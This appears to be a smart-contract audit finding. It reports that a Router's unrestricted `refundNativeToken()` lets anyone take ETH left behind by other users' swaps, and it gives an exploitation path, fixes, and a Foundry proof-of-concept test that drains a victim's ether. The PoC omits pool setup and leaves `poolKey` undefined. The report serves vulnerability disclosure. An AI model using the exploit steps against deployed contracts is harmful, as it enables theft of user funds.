## Title
Router Allows Theft of Excess ETH Through Unrestricted `refundNativeToken()` Function

## Summary
The Router contract inherits `refundNativeToken()` from PayableMulticallable which allows anyone to drain the Router's entire ETH balance. When users send ETH to Router in scenarios where the native token check at line 107 evaluates to false (but the function is still payable), the excess ETH accumulates in the Router and can be stolen by any attacker calling this public function.

## Impact
**Severity**: Medium to High

## Finding Description
**Location:** 
- [1](#0-0) 
- [2](#0-1) 

**Intended Logic:** The Router's line 107 determines when to forward ETH value to Core based on swap parameters. The `refundNativeToken()` function is intended to allow users to recover their own excess ETH sent during multicall operations.

**Actual Logic:** When users call swap functions with `msg.value > 0` but the conditions at line 107 are false (e.g., buying native token with another token, or exact output swaps), the ETH is not forwarded and remains in the Router's balance. The `refundNativeToken()` function has no access control and transfers the ENTIRE Router balance to `msg.sender`, allowing any attacker to steal accumulated ETH from other users.

**Exploitation Path:**
1. Victim calls `router.swap{value: X}(...)` in a scenario where `!params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS` evaluates to false (e.g., when buying token0=ETH with token1)
2. The X ETH is accepted by the payable function but value is calculated as 0 [3](#0-2) 
3. Core.swap() is called with value=0, so the ETH is not forwarded [4](#0-3) 
4. The swap settlement logic (lines 121-147) does not handle the unused msg.value, leaving it in Router's balance
5. Victim's transaction completes with X ETH stuck in Router
6. Attacker monitors Router's balance and calls `router.refundNativeToken()`
7. Attacker receives ALL of Router's ETH balance, including the victim's funds [5](#0-4) 

**Security Property Broken:** User funds should only be withdrawable by their rightful owner. The unrestricted `refundNativeToken()` function allows theft of user funds, violating basic custody principles.

## Impact Explanation
- **Affected Assets**: All ETH mistakenly or temporarily held in Router contract from any user
- **Damage Severity**: Complete loss of accumulated ETH for victims. Severity depends on Router balance - could range from dust amounts to significant sums if multiple users send excess ETH
- **User Impact**: Any user who sends ETH to Router in non-forwarding scenarios (wrong swap type, excess ETH for slippage buffers, UI estimation errors, or using standalone swap calls instead of multicall)

## Likelihood Explanation
- **Attacker Profile**: Any external account can execute this attack with a simple function call
- **Preconditions**: Router must have non-zero ETH balance from previous users' transactions. This can accumulate from legitimate user mistakes, slippage buffers, or UI estimation errors
- **Execution Complexity**: Single transaction calling `router.refundNativeToken()` - trivial to execute
- **Frequency**: Can be executed continuously whenever Router has ETH balance. Attackers can monitor mempool for transactions that leave ETH in Router and immediately front-run or follow with refund call

## Recommendation

The `refundNativeToken()` function should track which address deposited ETH and only allow refunds to the original sender. However, the simplest fix is to remove this function entirely and ensure Router never holds ETH between transactions:

```solidity
// In src/base/PayableMulticallable.sol:

// CURRENT (vulnerable):
function refundNativeToken() external payable {
    if (address(this).balance != 0) {
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }
}

// RECOMMENDED FIX 1: Remove function entirely
// Delete the function and ensure Router automatically refunds in the same transaction

// RECOMMENDED FIX 2: Add tracking and access control
mapping(address => uint256) private ethDeposits;

function refundNativeToken() external payable {
    uint256 refundAmount = ethDeposits[msg.sender];
    if (refundAmount > 0) {
        ethDeposits[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}
// Note: This requires modifying all payable functions to track deposits
```

Alternative: In Router.sol, add automatic refund logic at the end of swap functions to return any unused `msg.value`:

```solidity
// At end of handleLockData for CALL_TYPE_SINGLE_SWAP:
if (address(this).balance > 0) {
    SafeTransferLib.safeTransferETH(swapper, address(this).balance);
}
```

## Proof of Concept
```solidity
// File: test/Exploit_RouterETHTheft.t.sol
// Run with: forge test --match-test test_StealAccumulatedETH -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";

contract Exploit_RouterETHTheft is Test {
    Router router;
    Core core;
    
    address victim = address(0x1);
    address attacker = address(0x2);
    
    function setUp() public {
        // Deploy Core and Router
        core = new Core();
        router = new Router(ICore(address(core)));
        
        // Setup a pool with token0 = NATIVE_TOKEN_ADDRESS
        // (implementation details omitted for brevity)
    }
    
    function test_StealAccumulatedETH() public {
        // SETUP: Victim accidentally sends 1 ether when buying ETH with USDC
        // (swap where isToken1=true, so line 107 condition is false)
        vm.deal(victim, 2 ether);
        vm.prank(victim);
        
        // This swap doesn't need the 1 ether sent, so it stays in Router
        router.swap{value: 1 ether}(
            poolKey,  // token0=NATIVE_TOKEN_ADDRESS
            true,     // isToken1 = true (buying token0 with token1)
            1000e6,   // 1000 USDC
            SqrtRatio.wrap(0),
            0,
            type(int256).min
        );
        
        // Verify Router now holds the victim's 1 ether
        assertEq(address(router).balance, 1 ether, "Router should hold victim's ETH");
        
        // EXPLOIT: Attacker steals the ETH
        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        router.refundNativeToken();
        
        // VERIFY: Attacker stole victim's funds
        assertEq(address(router).balance, 0, "Router balance should be drained");
        assertEq(attacker.balance, attackerBalanceBefore + 1 ether, "Attacker stole 1 ether");
    }
}
```

## Notes

While the security question asks about "a malicious ERC20 token at address(0)" (which is impossible to deploy), the vulnerability discovered is directly related to the Router's native token handling logic at line 107. The issue arises because:

1. The check at line 107 determines when ETH value should be forwarded to Core
2. Router functions are `payable`, allowing ETH to be sent in all cases
3. When the check fails but users send ETH anyway, it accumulates in Router
4. The inherited `refundNativeToken()` function allows anyone to steal this accumulated ETH

This vulnerability affects real user funds and is exploitable through a simple external call. The function comment suggests it's for "transient payments" within multicall, but it's accessible externally and has no access controls, making it a critical security flaw.

### Citations

**File:** src/Router.sol (L105-110)
```text
            unchecked {
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L114-114)
```text
                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```
